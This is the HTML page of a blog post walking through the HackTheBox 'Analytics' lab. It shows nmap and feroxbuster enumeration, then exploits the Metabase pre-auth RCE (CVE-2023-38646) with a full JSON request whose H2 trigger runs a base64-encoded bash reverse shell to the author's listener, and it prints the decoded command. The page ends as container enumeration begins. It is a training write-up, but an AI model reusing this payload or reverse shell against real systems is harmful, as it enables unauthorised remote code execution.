<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Analytics is an easy difficulty box hosting an outdated Metabase service, vulnerable to Remote Code Execution. By leveraging this, we can gain shell access to a web server's docker container, where login credentials are insecurely stored as environment variables. After using ssh to authenticate to the host machine, we can use kernel exploitis CVE-2023-2640 & CVE-2023-32629 to elevate to root privileges.">
<title>HackTheBox - Analytics</title>

<link rel='canonical' href='http://localhost:1313/p/hackthebox-analytics/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Analytics">
<meta property='og:description' content="Analytics is an easy difficulty box hosting an outdated Metabase service, vulnerable to Remote Code Execution. By leveraging this, we can gain shell access to a web server's docker container, where login credentials are insecurely stored as environment variables. After using ssh to authenticate to the host machine, we can use kernel exploitis CVE-2023-2640 & CVE-2023-32629 to elevate to root privileges.">
<meta property='og:url' content='http://localhost:1313/p/hackthebox-analytics/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Remote Code Execution' /><meta property='article:tag' content='Metabase' /><meta property='article:tag' content='Docker' /><meta property='article:published_time' content='2024-03-22T19:35:09-05:00'/><meta property='article:modified_time' content='2024-03-22T19:35:09-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-analytics/Analytics.png' />
<meta name="twitter:title" content="HackTheBox - Analytics">
<meta name="twitter:description" content="Analytics is an easy difficulty box hosting an outdated Metabase service, vulnerable to Remote Code Execution. By leveraging this, we can gain shell access to a web server's docker container, where login credentials are insecurely stored as environment variables. After using ssh to authenticate to the host machine, we can use kernel exploitis CVE-2023-2640 & CVE-2023-32629 to elevate to root privileges."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-analytics/Analytics.png' />
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#foothold">Foothold</a>
      <ol>
        <li><a href="#exposed-secret-token-allows-for-remote-code-execution-when-establishing-a-new-database-cve-2023-38646">Exposed secret token allows for Remote Code Execution when establishing a new Database (CVE-2023-38646)</a></li>
        <li><a href="#enumerating-docker-container">Enumerating docker container</a></li>
      </ol>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/hackthebox-analytics/">
                <img src="/p/hackthebox-analytics/Analytics_hu9520986691391945751.png"
                        srcset="/p/hackthebox-analytics/Analytics_hu9520986691391945751.png 800w, /p/hackthebox-analytics/Analytics_hu1448447475239611753.png 1600w"
                        width="800" 
                        height="606" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Analytics" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/hackthebox-analytics/">HackTheBox - Analytics</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Analytics is an easy difficulty box hosting an outdated Metabase service, vulnerable to Remote Code Execution. By leveraging this, we can gain shell access to a web server&#39;s docker container, where login credentials are insecurely stored as environment variables. After using ssh to authenticate to the host machine, we can use kernel exploitis CVE-2023-2640 &amp; CVE-2023-32629 to elevate to root privileges.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 22, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    7 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration
</h2><p>Initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.233
</span></span><span class="line"><span class="cl">Host is up (0.044s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (conn-refused)
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://analytical.htb/
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that the web server on port 80 is attempting to redirect. So, we need to add <code>analytical.htb</code> to our /etc/hosts file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/Analytics]
</span></span><span class="line"><span class="cl">â””â”€$ tail /etc/hosts
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">10.10.11.233 analytical.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we are able to visit the main page:</p>
<p><img src="/p/hackthebox-analytics/Images/landingpage.png"
	width="1338"
	height="631"
	srcset="/p/hackthebox-analytics/Images/landingpage_hu8612160777802666740.png 480w, /p/hackthebox-analytics/Images/landingpage_hu8700528172226705266.png 1024w"
	loading="lazy"
	
		alt="landing page"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="508px"
	
></p>
<p>When we check the header tabs (&ldquo;About&rdquo;,&ldquo;Team&rdquo;, etc), we can see that <code>Login</code> takes us to a new subdomain. This is easier visualized by viewing the page source code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar-nav&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link active&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[#](view-source:http://analytical.htb/#)&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[#about](view-source:http://analytical.htb/#about)&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[#team](view-source:http://analytical.htb/#team)&#34;</span><span class="p">&gt;</span>Team<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[#services](view-source:http://analytical.htb/#services)&#34;</span><span class="p">&gt;</span>Services<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[#contact](view-source:http://analytical.htb/#contact)&#34;</span><span class="p">&gt;</span>Contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;[http://data.analytical.htb](view-source:http://data.analytical.htb/)&#34;</span><span class="p">&gt;</span>Login<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>None of the others go to new pages, however login will take us to <code>data.analytical.htb</code>. This also must be added to our /etc/hosts line first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.11.233 analytical.htb data.analytical.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now visiting the login domain, we see a Metabase login:</p>
<p><img src="/p/hackthebox-analytics/Images/MetabasePage.png"
	width="1192"
	height="713"
	srcset="/p/hackthebox-analytics/Images/MetabasePage_hu12388924353425639700.png 480w, /p/hackthebox-analytics/Images/MetabasePage_hu16747877152466438411.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="167"
		data-flex-basis="401px"
	
></p>
<p>Trying a few credentials as a guess doesn&rsquo;t work.
Taking a look at directory fuzzing, we can see <code>api</code> pages:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/Analytics]
</span></span><span class="line"><span class="cl">â””â”€$ feroxbuster -u http://data.analytical.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
</span></span><span class="line"><span class="cl">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
</span></span><span class="line"><span class="cl">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
</span></span><span class="line"><span class="cl">by Ben &#34;epi&#34; Risher ğŸ¤“                 ver: 2.10.0
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl"> ğŸ¯  Target Url            â”‚ http://data.analytical.htb
</span></span><span class="line"><span class="cl"> ğŸš€  Threads               â”‚ 50
</span></span><span class="line"><span class="cl"> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class="line"><span class="cl"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
</span></span><span class="line"><span class="cl"> ğŸ’¥  Timeout (secs)        â”‚ 7
</span></span><span class="line"><span class="cl"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.0
</span></span><span class="line"><span class="cl"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
</span></span><span class="line"><span class="cl"> ğŸ”  Extract Links         â”‚ true
</span></span><span class="line"><span class="cl"> ğŸ  HTTP methods          â”‚ [GET]
</span></span><span class="line"><span class="cl"> ğŸ”ƒ  Recursion Depth       â”‚ 4
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
</span></span><span class="line"><span class="cl">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class="line"><span class="cl">200      GET       28l     3538w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
</span></span><span class="line"><span class="cl">404      GET        1l        5w       30c http://data.analytical.htb/api
</span></span><span class="line"><span class="cl">404      GET        1l        2w       10c http://data.analytical.htb/app
</span></span><span class="line"><span class="cl">&lt;...SNIP..&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="foothold">Foothold
</h2><h3 id="exposed-secret-token-allows-for-remote-code-execution-when-establishing-a-new-database-cve-2023-38646">Exposed secret token allows for Remote Code Execution when establishing a new Database (CVE-2023-38646)
</h3><p>Researching Metabase vulnerabilities, we can find <a class="link" href="https://www.metabase.com/blog/security-incident-summary"  target="_blank" rel="noopener"
    >this recent incident disclosure</a>. There is an admission that a private setup-token can actually be viewed upon accessing <code>/api/session/properties</code>. When visiting this page, we can find the setup-token for our target as well!</p>
<p><img src="/p/hackthebox-analytics/Images/setup-token.png"
	width="635"
	height="360"
	srcset="/p/hackthebox-analytics/Images/setup-token_hu9036765336132224285.png 480w, /p/hackthebox-analytics/Images/setup-token_hu13225144276203636790.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="423px"
	
></p>
<p>Next, we can go to <code>/api/setup/validate</code> and supply the token, setup an H2 database, and achieve remote code execution! How this is done, exactly, isn&rsquo;t explained well in the disclosure. However, with a little bit of looking, we might find <a class="link" href="https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/"  target="_blank" rel="noopener"
    >another article</a> that can detail a working payload.
The payload can be supplied a few ways, but I decided to utilize burpsuite since it has a Pretty function, making the request easier to read and understand. Request payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">POST</span> <span class="err">/api/setup/validate</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="err">data.analytical.htb</span>
</span></span><span class="line"><span class="cl"><span class="err">Content-Type:</span> <span class="err">application/json</span>
</span></span><span class="line"><span class="cl"><span class="err">Content-Length:</span> <span class="mi">598</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;token&#34;</span><span class="p">:</span><span class="s2">&#34;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;details&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is_on_demand&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is_full_sync&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is_sample&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;cache_ttl&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;refingerprint&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;auto_run_queries&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;schedules&#34;</span><span class="p">:{},</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;details&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;db&#34;</span><span class="p">:</span><span class="s2">&#34;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}&#39;)\n$$--=x&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;advanced-options&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;ssl&#34;</span><span class="p">:</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">                <span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;asdf&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&#34;engine&#34;</span><span class="p">:</span><span class="s2">&#34;h2&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Request/Response in Burpsuite:</p>
<p><img src="/p/hackthebox-analytics/Images/burp1.png"
	width="1016"
	height="595"
	srcset="/p/hackthebox-analytics/Images/burp1_hu3365995802342556385.png 480w, /p/hackthebox-analytics/Images/burp1_hu17429511021147418333.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="409px"
	
>
Payload is within the <code>exec</code> segment: <code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}</code> The base64 encoded string refers to a basic rev shell: <code>bash -i &gt;&amp; /dev/tcp/10.10.14.191/8888 0&gt;&amp;1</code> Using the base64 in this way will avoid errors from special characters such as &gt; and &amp;.
On my netcat listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/Analytics]
</span></span><span class="line"><span class="cl">â””â”€$ nc -nvlp 8888         
</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.191] from (UNKNOWN) [10.10.11.233] 51222
</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1): Not a tty
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">2c83a4df89a6:/$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="enumerating-docker-container">Enumerating docker container
</h3><p>We can find out rather quickly that this is a docker container, based on the <code>.dockerenv</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
